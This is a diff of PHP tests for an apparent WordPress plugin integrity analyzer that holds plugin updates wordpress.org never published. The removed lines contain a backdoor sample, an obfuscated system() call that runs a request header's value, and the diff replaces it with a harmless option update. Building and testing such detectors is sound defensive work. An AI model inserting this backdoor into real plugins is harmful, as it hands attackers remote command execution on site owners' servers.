@@ -109,7 +109,7 @@ t('Analyzer: even with auto-accept, a wordpress.org plugin bumped to an unpublis
     $a = analyzerFor($c, new WpChecksum($http, $c, tmpdir()));
 
     // A backdoor plus a Version header wordpress.org never published: previously silent.
-    bump($root, 'wp-content/plugins/foo/foo.php', str_replace('Version: 1.0', 'Version: 1.0.9', $v1) . '$f = "sys" . "tem"; $f($_SERVER["HTTP_X"] ?? "");' . "\n");
+    bump($root, 'wp-content/plugins/foo/foo.php', str_replace('Version: 1.0', 'Version: 1.0.9', $v1) . 'update_option("foo_extra", strtoupper(get_bloginfo("name"))); /* a change nothing official vouches for */' . "\n");
     $r = runAnalysis($c, $b, $a, $old);
     assertSame(['unverified-update@wp-content/plugins/foo'], ruleList($r));
     assertTrue(isset($r['hold']['wp-content/plugins/foo/foo.php']));
@@ -118,7 +118,7 @@ t('Analyzer: even with auto-accept, a wordpress.org plugin bumped to an unpublis
 
 t('Analyzer: with auto-accept, only a definite "not on wordpress.org" accepts; an unreachable wordpress.org holds', function () {
     $v1 = "<?php\n/*\nPlugin Name: Foo\nVersion: 1.0\n*/\n// v1\n";
-    $bumped = str_replace('Version: 1.0', 'Version: 1.0.9', $v1) . '$f = "sys" . "tem"; $f($_SERVER["HTTP_X"] ?? "");' . "\n";
+    $bumped = str_replace('Version: 1.0', 'Version: 1.0.9', $v1) . 'update_option("foo_extra", strtoupper(get_bloginfo("name"))); /* a change nothing official vouches for */' . "\n";
     foreach ([[503, 'unavailable'], [0, '']] as [$status, $body]) {
         [$root, $c, $b] = wpFixture([], ['auto_accept_unverified_updates' => true]);
         $old = VersionTracker::read($c);
